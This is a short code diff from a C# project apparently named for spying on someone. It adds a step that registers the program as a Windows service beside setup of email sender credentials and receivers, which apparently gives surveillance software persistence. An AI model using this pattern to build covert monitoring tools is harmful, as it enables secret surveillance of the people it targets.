@@ -20,6 +20,11 @@ namespace SomeOneSpyingOnYou.Services
             var sender = UpdateSenderInformation();
             var receivers = UpdateReceivers();
 
+            using (WindowsService windowsService = new WindowsService())
+            {
+                windowsService.Register();
+            }
+
             return new Tuple<EmailCredentials, string>(sender, receivers);
         }
 
